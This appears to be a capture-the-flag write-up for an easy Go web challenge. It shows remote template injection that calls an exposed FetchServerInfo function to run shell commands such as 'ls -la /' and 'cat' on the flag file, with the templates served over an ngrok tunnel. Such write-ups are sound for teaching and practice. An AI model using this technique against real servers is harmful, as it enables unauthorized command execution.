# Renderquest

An easy Web challenge.

## Description

You've found a website that lets you input remote templates for rendering. Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag. Good luck!

**Source?** Yes.

### Initial analysis

A webpage with a single input. Seems like it is meant to render a custom template when given the path. Inputting something random like "hej", returns an internal server error.
The query is of the form:

- <http://localhost:1337/render?use_remote=true&page=ServerInfo.OS>

It seems we are to create a GO template and supply the path to it. We are given a list of available data for the template:

``` GO
    ClientIP
    ClientUA
    ClientIpInfo.IpVersion
    ClientIpInfo.IpAddress
    ClientIpInfo.Latitude
    ClientIpInfo.Longitude
    ClientIpInfo.CountryName
    ClientIpInfo.CountryCode
    ClientIpInfo.TimeZone
    ClientIpInfo.ZipCode
    ClientIpInfo.CityName
    ClientIpInfo.RegionName
    ClientIpInfo.Continent
    ClientIpInfo.ContinentCode
    ServerInfo.Hostname
    ServerInfo.OS
    ServerInfo.KernelVersion
    ServerInfo.Memory
```

We are required to host the template to be loaded. Therefore i use `python -m http.server 8080`.
To be able to supply the HTB instance with the template ngrok is used to create a secure tunnel to the locally hosted python webserver. The ngrok command is `ngrok http 8080`.

*DISCLAIMER* It is required to have a ngrok account and API key for the ngrok approach to work and not necesarry for this challenge, just my approach.

To check if the GO template method works, a template with

```GO {{ html "test" }}```

This renders the html page containing "test". Which shows we care able to control the output of the page.

### Getting RCE

Checking out main.go we see a lot of functions. Especially the FetchServerInfo() function is interesting, as it makes the following call:  `out, err := exec.Command("sh", "-c", command).Output`. Where the *command* is an argument passed to the function.

In go it is possible to call functions in the template using `{{ ."SomeFunction" "argument" }}`.

This allows us to craft a payload in a simple GO template file (.tpl) which will print the output to the webbrowser because the *out* variabel is returned in the `FetchServerInfo`() function.

The payload consists of to templates. The first has the purpose of finding the flag. The find.tpl template which contains the GO code:

```GO
{{ .FetchServerInfo "ls -la /" }}
```

first.tpl the directory structure of the server hosting the website and the files it contains.

The second template, flag.tpl contains the following GO code:

```GO
{{ .FetchServerInfo "cat /unique-flag-name.txt" }}

```

To provide these templates to be rendered by the challenge instance, the ngrok url is used as follows: `https://unique-ngrok-url/*template.tpl*`

Provide the templates in order to obtain the random flag name, and render the contents afterwards.

This concludes this challenge.
